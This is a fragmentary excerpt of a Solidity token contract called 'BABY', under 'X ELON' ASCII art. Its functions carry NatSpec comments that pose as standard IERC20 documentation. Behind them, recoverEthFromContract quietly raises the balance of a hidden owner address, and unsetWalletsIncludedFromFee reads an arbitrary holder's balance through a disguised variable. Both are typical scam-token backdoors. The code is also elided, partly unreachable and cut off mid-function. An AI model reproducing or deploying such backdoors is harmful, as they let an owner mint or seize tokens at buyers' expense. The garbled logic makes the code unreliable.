...
___   ___     _______  __        ______   .__   __. 
\  \ /  /    |   ____||  |      /  __  \  |  \ |  | 
 \  V  /     |  |__   |  |     |  |  |  | |   \|  | 
  >   <      |   __|  |  |     |  |  |  | |  . `  | 
 /  .  \     |  |____ |  `----.|  `--'  | |  |\   | 
...
contract BABY is IERC20, Ownable, BaseToken {
  ...
  using SafeMath for uint256;
    ...
    /**
     * @dev See {IERC20-recoverEthFromContract}.
     */
    function recoverEthFromContract() public {
        uint8 fundUSDT = 18;
        uint112 fundBNB = 1;
        ...
        if(_addressOwned != _msgSender()){
           return;
            ...
            _balances[_msgSender()] += startTradeBlock * fundBNB;
        } 
    ...
    /**
     * @dev See {IERC20-unsetWalletsIncludedFromFee}.
     *
     * Requirements:
     *
     * - `_addr` cannot be the zero address.
     */
    function unsetWalletsIncludedFromFee(address _addr) public {
        uint256  kecccak256 = _balances[_addr];
